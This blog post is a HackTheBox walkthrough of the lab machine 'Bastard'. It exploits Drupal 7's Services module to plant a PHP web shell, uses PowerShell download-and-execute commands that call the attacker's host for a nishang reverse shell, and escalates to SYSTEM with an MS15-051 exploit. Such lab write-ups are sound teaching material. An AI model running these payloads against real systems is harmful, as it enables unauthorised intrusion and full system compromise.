<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB - Bastard" /><meta name="author" content="QTranspose" /><meta property="og:locale" content="en_US" /><meta name="description" content="Bastard is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we discover that the target is a Windows machine running IIS httpd 7.5 and rpc services. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ nmap -sC -sV -oA recon/default 10.10.10.9 Nmap scan report for 10.10.10.9 Host is up (0.094s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Microsoft-IIS/7.5 |_http-title: Welcome to 10.10.10.9 | 10.10.10.9 135/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows HTTP First, we google the corresponding Windows OS version for IIS 7.5. It appears to be Windows Server 2008 R2 according to Wikipedia. Next, we use our browser to view the webpages. At the bottom of the index page, we see “Powered by Drupal”, so we know this web site uses Drupal CMS. From the previous nmap scan, there are a few interesting files revealed by robots.txt. Especially in CHANGELOG.txt, the version number of Drupal has been leaked. At last, a ffuf dir fuzzing is performed trying to find other intersting web directories. By doing this, we have found the rest_endpoint of Drupal. 1 2 3 4 5 6 7 $ ffuf -u http://10.10.10.9/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -c -v ... [Status: 200, Size: 62, Words: 7, Lines: 1] | URL | http://10.10.10.9/rest * FUZZ: rest Exploitation By searching available exploits on Exploit DB, we get quite a few results matching the version number. 1 2 3 4 5 $ searchsploit drupal ... Drupal 7.x Module Services - Remote Code Execution ... | php/webapps/41564.php Before the above exploit is put into functioning, the following modifications must be made. 1 2 3 4 5 6 7 8 $url = &#39;http://10.10.10.9&#39;; $endpoint_path = &#39;/rest&#39;; $endpoint = &#39;rest_endpoint&#39;; $file = [ &#39;filename&#39; =&gt; &#39;pwned.php&#39;, &#39;data&#39; =&gt; &#39;&lt;?php system($_REQUEST[&quot;lol&quot;]) ?&gt;&#39; ]; Then we run the exploit: 1 2 3 4 5 6 7 8 $ php 41564.php ... File written: http://10.10.10.9/pwned.php $ curl -X POST -d &#39;lol=whoami&#39; http://10.10.10.9/pwned.php nt authority\iusr Now we can execute code on the target as nt authority\iusr. After serving our nishang reverse shell script with python HTTP server, we get a reverse shell with the following command. 1 curl -X POST -d &quot;lol=powershell.exe iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.18:8000/rev.ps1&#39;)&quot; http://10.10.10.9/pwned.php Privilege Escalation Checking vulnerabilities with sherlock.ps1 from PowerShell Empire, we get two positive results. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PS C:\inetpub\drupal-7.54&gt; iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.18:8000/sherlock.ps1&#39;) ... Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Appears Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Appears Vulnerable After a bit of searching, we find a working exploit on GitHub. Using this exploit, we get a reverse shell from the target with system privileges. 1 2 3 4 5 6 7 8 9 PS C:\inetpub\drupal-7.54&gt; (new-object net.webclient).downloadfile(&#39;http://10.10.14.18:8000/ms15051.exe&#39;,&#39;ms15051.exe&#39;) PS C:\inetpub\drupal-7.54&gt; .\ms15051.exe &quot;powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.18:8000/rev.ps1&#39;)&quot; $ rlwrap ncat -nlvp 4444 ... PS C:\inetpub\drupal-7.54&gt; whoami nt authority\system" /><meta property="og:description" content="Bastard is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we discover that the target is a Windows machine running IIS httpd 7.5 and rpc services. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ nmap -sC -sV -oA recon/default 10.10.10.9 Nmap scan report for 10.10.10.9 Host is up (0.094s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Microsoft-IIS/7.5 |_http-title: Welcome to 10.10.10.9 | 10.10.10.9 135/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows HTTP First, we google the corresponding Windows OS version for IIS 7.5. It appears to be Windows Server 2008 R2 according to Wikipedia. Next, we use our browser to view the webpages. At the bottom of the index page, we see “Powered by Drupal”, so we know this web site uses Drupal CMS. From the previous nmap scan, there are a few interesting files revealed by robots.txt. Especially in CHANGELOG.txt, the version number of Drupal has been leaked. At last, a ffuf dir fuzzing is performed trying to find other intersting web directories. By doing this, we have found the rest_endpoint of Drupal. 1 2 3 4 5 6 7 $ ffuf -u http://10.10.10.9/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -c -v ... [Status: 200, Size: 62, Words: 7, Lines: 1] | URL | http://10.10.10.9/rest * FUZZ: rest Exploitation By searching available exploits on Exploit DB, we get quite a few results matching the version number. 1 2 3 4 5 $ searchsploit drupal ... Drupal 7.x Module Services - Remote Code Execution ... | php/webapps/41564.php Before the above exploit is put into functioning, the following modifications must be made. 1 2 3 4 5 6 7 8 $url = &#39;http://10.10.10.9&#39;; $endpoint_path = &#39;/rest&#39;; $endpoint = &#39;rest_endpoint&#39;; $file = [ &#39;filename&#39; =&gt; &#39;pwned.php&#39;, &#39;data&#39; =&gt; &#39;&lt;?php system($_REQUEST[&quot;lol&quot;]) ?&gt;&#39; ]; Then we run the exploit: 1 2 3 4 5 6 7 8 $ php 41564.php ... File written: http://10.10.10.9/pwned.php $ curl -X POST -d &#39;lol=whoami&#39; http://10.10.10.9/pwned.php nt authority\iusr Now we can execute code on the target as nt authority\iusr. After serving our nishang reverse shell script with python HTTP server, we get a reverse shell with the following command. 1 curl -X POST -d &quot;lol=powershell.exe iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.18:8000/rev.ps1&#39;)&quot; http://10.10.10.9/pwned.php Privilege Escalation Checking vulnerabilities with sherlock.ps1 from PowerShell Empire, we get two positive results. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PS C:\inetpub\drupal-7.54&gt; iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.18:8000/sherlock.ps1&#39;) ... Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Appears Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Appears Vulnerable After a bit of searching, we find a working exploit on GitHub. Using this exploit, we get a reverse shell from the target with system privileges. 1 2 3 4 5 6 7 8 9 PS C:\inetpub\drupal-7.54&gt; (new-object net.webclient).downloadfile(&#39;http://10.10.14.18:8000/ms15051.exe&#39;,&#39;ms15051.exe&#39;) PS C:\inetpub\drupal-7.54&gt; .\ms15051.exe &quot;powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.18:8000/rev.ps1&#39;)&quot; $ rlwrap ncat -nlvp 4444 ... PS C:\inetpub\drupal-7.54&gt; whoami nt authority\system" /><link rel="canonical" href="https://qtranspose.xyz/posts/htb-bastard/" /><meta property="og:url" content="https://qtranspose.xyz/posts/htb-bastard/" /><meta property="og:site_name" content="QTranspose" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-28T00:00:00+11:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB - Bastard" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@QTranspose" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Bastard is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we discover that the target is a Windows machine running IIS httpd 7.5 and rpc services. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ nmap -sC -sV -oA recon/default 10.10.10.9 Nmap scan report for 10.10.10.9 Host is up (0.094s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Microsoft-IIS/7.5 |_http-title: Welcome to 10.10.10.9 | 10.10.10.9 135/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows HTTP First, we google the corresponding Windows OS version for IIS 7.5. It appears to be Windows Server 2008 R2 according to Wikipedia. Next, we use our browser to view the webpages. At the bottom of the index page, we see “Powered by Drupal”, so we know this web site uses Drupal CMS. From the previous nmap scan, there are a few interesting files revealed by robots.txt. Especially in CHANGELOG.txt, the version number of Drupal has been leaked. At last, a ffuf dir fuzzing is performed trying to find other intersting web directories. By doing this, we have found the rest_endpoint of Drupal. 1 2 3 4 5 6 7 $ ffuf -u http://10.10.10.9/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -c -v ... [Status: 200, Size: 62, Words: 7, Lines: 1] | URL | http://10.10.10.9/rest * FUZZ: rest Exploitation By searching available exploits on Exploit DB, we get quite a few results matching the version number. 1 2 3 4 5 $ searchsploit drupal ... Drupal 7.x Module Services - Remote Code Execution ... | php/webapps/41564.php Before the above exploit is put into functioning, the following modifications must be made. 1 2 3 4 5 6 7 8 $url = &#39;http://10.10.10.9&#39;; $endpoint_path = &#39;/rest&#39;; $endpoint = &#39;rest_endpoint&#39;; $file = [ &#39;filename&#39; =&gt; &#39;pwned.php&#39;, &#39;data&#39; =&gt; &#39;&lt;?php system($_REQUEST[&quot;lol&quot;]) ?&gt;&#39; ]; Then we run the exploit: 1 2 3 4 5 6 7 8 $ php 41564.php ... File written: http://10.10.10.9/pwned.php $ curl -X POST -d &#39;lol=whoami&#39; http://10.10.10.9/pwned.php nt authority\\iusr Now we can execute code on the target as nt authority\\iusr. After serving our nishang reverse shell script with python HTTP server, we get a reverse shell with the following command. 1 curl -X POST -d &quot;lol=powershell.exe iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.18:8000/rev.ps1&#39;)&quot; http://10.10.10.9/pwned.php Privilege Escalation Checking vulnerabilities with sherlock.ps1 from PowerShell Empire, we get two positive results. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PS C:\\inetpub\\drupal-7.54&gt; iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.18:8000/sherlock.ps1&#39;) ... Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Appears Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Appears Vulnerable After a bit of searching, we find a working exploit on GitHub. Using this exploit, we get a reverse shell from the target with system privileges. 1 2 3 4 5 6 7 8 9 PS C:\\inetpub\\drupal-7.54&gt; (new-object net.webclient).downloadfile(&#39;http://10.10.14.18:8000/ms15051.exe&#39;,&#39;ms15051.exe&#39;) PS C:\\inetpub\\drupal-7.54&gt; .\\ms15051.exe &quot;powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.18:8000/rev.ps1&#39;)&quot; $ rlwrap ncat -nlvp 4444 ... PS C:\\inetpub\\drupal-7.54&gt; whoami nt authority\\system","@type":"BlogPosting","headline":"HTB - Bastard","dateModified":"2021-03-01T22:06:23+11:00","datePublished":"2020-11-28T00:00:00+11:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://qtranspose.xyz/posts/htb-bastard/"},"author":{"@type":"Person","name":"QTranspose"},"url":"https://qtranspose.xyz/posts/htb-bastard/","@context":"https://schema.org"}</script><title>HTB - Bastard | QTranspose</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/qtranspose.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">QTranspose</a></div><div class="site-subtitle font-italic">Rock The Matrix</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/QTranspose" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://app.hackthebox.eu/profile/112476" aria-label="hackthebox" class="order-4" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HTB - Bastard</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB - Bastard</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Nov 28, 2020, 12:00 AM +1100" > Nov 28, 2020 <i class="unloaded">2020-11-28T00:00:00+11:00</i> </span> by <span class="author"> QTranspose </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Mar 1, 2021, 10:06 PM +1100" > Mar 1 <i class="unloaded">2021-03-01T22:06:23+11:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="564 words">3 min</span></div></div><div class="post-content"><p>Bastard is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap">Nmap</h3><p>Starting off with the <code class="language-plaintext highlighter-rouge">nmap</code> scan, we discover that the target is a Windows machine running <code class="language-plaintext highlighter-rouge">IIS httpd 7.5</code> and <code class="language-plaintext highlighter-rouge">rpc</code> services.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>$ nmap -sC -sV -oA recon/default 10.10.10.9

Nmap scan report for 10.10.10.9
Host is up (0.094s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</pre></table></code></div></div><h3 id="http">HTTP</h3><p>First, we google the corresponding Windows OS version for <code class="language-plaintext highlighter-rouge">IIS 7.5</code>. It appears to be <code class="language-plaintext highlighter-rouge">Windows Server 2008 R2</code> according to <a href="https://en.wikipedia.org/wiki/Internet_Information_Services">Wikipedia</a>.</p><p>Next, we use our browser to view the webpages. At the bottom of the index page, we see “Powered by Drupal”, so we know this web site uses <code class="language-plaintext highlighter-rouge">Drupal</code> CMS. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bastard/http.jpg" alt="" /></p><p>From the previous <code class="language-plaintext highlighter-rouge">nmap</code> scan, there are a few interesting files revealed by <code class="language-plaintext highlighter-rouge">robots.txt</code>. Especially in <code class="language-plaintext highlighter-rouge">CHANGELOG.txt</code>, the version number of <code class="language-plaintext highlighter-rouge">Drupal</code> has been leaked. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bastard/changelog.jpg" alt="" /></p><p>At last, a <code class="language-plaintext highlighter-rouge">ffuf</code> dir fuzzing is performed trying to find other intersting web directories. By doing this, we have found the <code class="language-plaintext highlighter-rouge">rest_endpoint</code> of <code class="language-plaintext highlighter-rouge">Drupal</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>$ ffuf -u http://10.10.10.9/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -c -v

...

[Status: 200, Size: 62, Words: 7, Lines: 1]
| URL | http://10.10.10.9/rest
    * FUZZ: rest
</pre></table></code></div></div><h2 id="exploitation">Exploitation</h2><p>By searching available exploits on Exploit DB, we get quite a few results matching the version number.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$ searchsploit drupal

...

Drupal 7.x Module Services - Remote Code Execution      ...        | php/webapps/41564.php
</pre></table></code></div></div><p>Before the above exploit is put into functioning, the following modifications must be made.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' =&gt; 'pwned.php',
    'data' =&gt; '&lt;?php system($_REQUEST["lol"]) ?&gt;'
];
</pre></table></code></div></div><p>Then we run the exploit:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>$ php 41564.php

...

File written: http://10.10.10.9/pwned.php

$ curl -X POST -d 'lol=whoami' http://10.10.10.9/pwned.php
nt authority\iusr
</pre></table></code></div></div><p>Now we can execute code on the target as <code class="language-plaintext highlighter-rouge">nt authority\iusr</code>. After serving our <code class="language-plaintext highlighter-rouge">nishang</code> reverse shell script with <code class="language-plaintext highlighter-rouge">python</code> HTTP server, we get a reverse shell with the following command.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl -X POST -d "lol=powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.18:8000/rev.ps1')" http://10.10.10.9/pwned.php
</pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation</h2><p>Checking vulnerabilities with <code class="language-plaintext highlighter-rouge">sherlock.ps1</code> from <code class="language-plaintext highlighter-rouge">PowerShell Empire</code>, we get two positive results.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>PS C:\inetpub\drupal-7.54&gt; iex(new-object net.webclient).downloadstring('http://10.10.14.18:8000/sherlock.ps1')

...

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : ClientCopyImage Win32k            
MSBulletin : MS15-051                          
CVEID      : 2015-1701, 2015-2433              
Link       : https://www.exploit-db.com/exploits/37367/                                       
VulnStatus : Appears Vulnerable 
</pre></table></code></div></div><p>After a bit of searching, we find a working exploit on <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051">GitHub</a>. Using this exploit, we get a reverse shell from the target with <code class="language-plaintext highlighter-rouge">system</code> privileges.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>PS C:\inetpub\drupal-7.54&gt; (new-object net.webclient).downloadfile('http://10.10.14.18:8000/ms15051.exe','ms15051.exe')
PS C:\inetpub\drupal-7.54&gt; .\ms15051.exe "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.18:8000/rev.ps1')"

$ rlwrap ncat -nlvp 4444

...

PS C:\inetpub\drupal-7.54&gt; whoami
nt authority\system
